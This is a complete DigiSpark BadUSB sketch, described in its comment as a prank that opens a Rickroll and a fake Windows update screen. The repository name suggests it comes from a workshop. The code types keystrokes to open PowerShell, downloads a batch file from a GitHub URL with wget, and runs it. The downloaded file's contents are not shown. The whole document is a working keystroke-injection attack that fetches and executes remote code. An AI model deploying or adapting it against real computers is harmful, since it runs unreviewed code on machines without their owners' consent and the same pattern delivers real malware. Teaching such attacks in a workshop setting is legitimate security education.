//This DigiSpark script opens up Rick Astley's - Never Gonna Give You Up and also a fake Windows update screen and then maximizes it using F11
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(1000);
}
void loop() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("wget -O fungame.bat 'https://raw.githubusercontent.com/psuieee/BadUSBWorkshop/refs/heads/main/NathanFunGame.bat'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("./fungame.bat");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000000);
  for(;;){ /*empty*/ }
}


